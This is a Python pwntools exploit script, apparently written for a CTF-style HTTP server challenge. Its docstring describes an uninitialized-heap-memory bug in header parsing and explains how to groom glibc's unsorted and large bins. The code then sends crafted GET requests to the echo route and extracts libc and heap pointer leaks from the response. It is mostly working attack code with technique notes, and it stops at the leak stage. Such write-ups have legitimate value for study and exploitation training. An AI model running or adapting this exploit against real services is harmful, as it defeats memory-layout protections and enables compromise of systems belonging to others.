#!/usr/bin/env python3
from pwn import * 
p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

'''

Vulnerability
===================
When parsing a header, if there is NO 'value' in it ('AAA' instead of 'AAA:BBB')
then the header 'value_len' is initialized to be the SAME as the 'key_len'.
As a result, when using the 'value' it will be uninitialized but will attempt
to be the same as the 'key_len'. This allows for the reading of data 
from the heap without being initialized in VERY large quanities.

By using the 'echo' route, we are able to read the header value for the 
information leak.

Grooming + Exploitation
==============

The grooming really relies on understanding HOW the allocator works. 
A few things make it difficult though: 
- It's at the beginning of the program with very little control of the shape. 
- There are VERY few calls to free. It is impossible to get more than 1 chunk into
    a tcache bin at a time. 

As a result, a few primitives for leaks go off of the table if 
we don't allocate things properly at the beginning:
- We cannot use the 'fd' pointer to leak. This is since the 'fd' pointer
  will be zero if it's the only item in the bin. 
- LARGE allocations will by default be at the top of the heap, meaning 
  there will be consoliated into the top chunk, where the pointers from the 
  allocated are never added to memory. 
- No objects with pointers are freed at this stage. So, using an object
  from the rest of the program will not work either. 

As a result, we need to manipulate the heap in such a way that pointers
get put into our section ('fd', 'bk', etc.) of a chunk. This leaves us with 
the unsorted, large and small bins. 

To do this, we need to make the VERY beginning of the program create a large
allocation. Then, when another allocation occurs BELOW (higher in memory) 
our chunk will go into the 'unsorted_bin' instead of the 'top_chunk', once it 
is freed. The best place to do this is in the call to 'read_wrapper' at
the very beginning of the 'serve_main' for the first line of the HTTP request. 
This is the best place to do the grooming for a few reason: 
* 'parse_uri' & 'url_decode' are GREAT for creating huge chunks that will last
* We need to place the 'key' of our header in the URI for the 'echo' request anyway.

Once the grooming is setup, TWO very large allocations will be made in order
to parse our headers for the 'key' and 'value' within 'parse_single_header'.
The uninitialized memory used for the 'value' is actually the ONLY item in a
particular 'large bin'.

This is particularly awesome because the 'fd' and 'bk' pointers will point
to the bin itself (libc). While the 'fd_nextsize' and 'bk_nextsize' pointers
will point to the CHUNK ITSELF (heap) since it's the only item of it's size. 
Neat! For this, we get BOTH a heap and libc leak :) 

All we have to do is READ the header value and we get a VERY large leak from the 
echo route. Hurray!
'''

attack_string = b"Header" + b"C" * 0x2000 # Grooming
line_one = b"GET /echo?A=B&req_type=header&key=" + attack_string + b"&res_type=body HTTP/1.1"
p.sendline(line_one) 

# Trigger uninitialized memory bug with a header without a colon and value.
header_one = attack_string
p.sendline(header_one)
p.sendline(b"")


## Parse the response AND leak
# Grab and parse the 'Content-Length' header
first_line = p.recvline()
first_header = str(p.recvline())

value_of_header = first_header.split(':')[1]
content_length_value = ''.join(c for c in value_of_header if c.isdigit())

# Newline between headers and body
blank =  p.recvline() 

# The BODY of the request
print(content_length_value)
body = p.recvn(int(content_length_value)) 

'''
Uninitialized memory is in the 'value' of the header
'''
value = body.split(b':')[1]

libc_leak = u64(value[0:8])
heap_leak = u64(value[16:24])
print(hex(libc_leak))
print(hex(heap_leak))
